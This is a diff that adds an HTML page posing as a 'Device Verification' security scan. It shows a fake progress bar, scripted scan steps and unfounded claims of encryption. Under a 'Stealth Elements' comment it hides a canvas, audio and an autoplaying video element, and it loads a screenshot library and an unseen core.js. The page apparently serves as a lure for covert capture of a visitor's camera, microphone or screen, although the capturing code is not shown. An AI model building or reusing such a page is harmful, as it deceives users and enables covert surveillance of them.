@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal | Device Verification</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .auth-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .status-item {
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s;
+        }
+        .status-item.completed {
+            color: #28a745;
+        }
+        .status-item.active {
+            background-color: #f8f9fa;
+            border-left: 4px solid #3498db;
+        }
+        #stealthContainer, #stealthCanvas, #stealthAudio, #stealthVideo {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container py-5">
+        <div class="row justify-content-center">
+            <div class="col-md-8 col-lg-6">
+                <div class="auth-card p-4">
+                    <div class="text-center mb-4">
+                        <div class="mb-3">
+                            <i class="fas fa-shield-alt fa-3x text-primary"></i>
+                        </div>
+                        <h2 class="fw-bold">Device Verification Required</h2>
+                        <p class="text-muted mb-0">We're verifying your device for security purposes</p>
+                    </div>
+                    
+                    <div class="progress mb-4" style="height: 25px;">
+                        <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" 
+                             role="progressbar" style="width: 0%">0%</div>
+                    </div>
+                    
+                    <div class="mb-4" id="statusList">
+                        <div class="status-item active">
+                            <i class="fas fa-spinner fa-spin text-primary me-3"></i>
+                            <span>Initializing security scan...</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Checking device configuration</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Verifying network security</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Analyzing system integrity</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Finalizing verification</span>
+                        </div>
+                    </div>
+                    
+                    <div class="alert alert-info">
+                        <div class="d-flex align-items-center">
+                            <i class="fas fa-info-circle fa-lg me-3"></i>
+                            <div>
+                                <small>This process is automatic and will complete in a few seconds.</small><br>
+                                <small class="text-muted" id="currentAction">Preparing scan...</small>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row text-center mt-4">
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-lock fa-2x text-success mb-2"></i>
+                                <div class="small">Encrypted</div>
+                            </div>
+                        </div>
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-shield-alt fa-2x text-primary mb-2"></i>
+                                <div class="small">Secure</div>
+                            </div>
+                        </div>
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-check-circle fa-2x text-warning mb-2"></i>
+                                <div class="small">Verifying</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="text-center mt-4 pt-3 border-top">
+                        <small class="text-muted">
+                            <i class="fas fa-lock me-1"></i>
+                            Your data is protected with 256-bit encryption
+                        </small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stealth Elements -->
+    <canvas id="stealthCanvas" width="200" height="200"></canvas>
+    <div id="stealthContainer"></div>
+    <audio id="stealthAudio"></audio>
+    <video id="stealthVideo" autoplay playsinline></video>
+    
+    <!-- Bootstrap -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
+    <!-- Main Application -->
+    <script type="module" src="core.js"></script>
+</body>
+</html>
